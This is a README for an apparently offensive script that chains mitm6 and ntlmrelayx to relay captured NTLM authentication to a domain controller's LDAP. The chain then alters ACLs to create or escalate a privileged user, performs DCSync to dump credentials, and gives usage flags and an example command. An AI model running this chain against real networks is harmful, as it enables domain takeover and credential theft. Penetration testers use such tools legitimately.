This script automates running mitm6 and ntlmrelayx so if an administrator logs inside a machine on the network it catches the ntlm hash, relay it to ldap/s on the domain controler, modifying ACLs to create a user and add it to a privilege group, or escalate an existing one and giving it rights to perform DCSync, performs DCSync with secretsdump and resets the ACLs using [ACLpwn](https://github.com/fox-it/aclpwn.py).

Usage:
```
Usage:
-m <attack mode>, select attack mode, add or escalate, escalate needs user and password set
-d <domain name>, for example company.local
-i <interface>, for example eth0
-n <full dc name>, for example dc.company.local
-t <dc ip>
-u <username>
-p <password>
-h Show this menu
```

Escalate user only needs Ldap on the DC, add a new one needs Ldaps.

Example:
```
./ntlm-to-ldap.sh -m add -d KAIBA-CORP.local -i eth1 -n KAIBA-CORP-DC.KAIBA-CORP.local -t 192.168.56.18
```
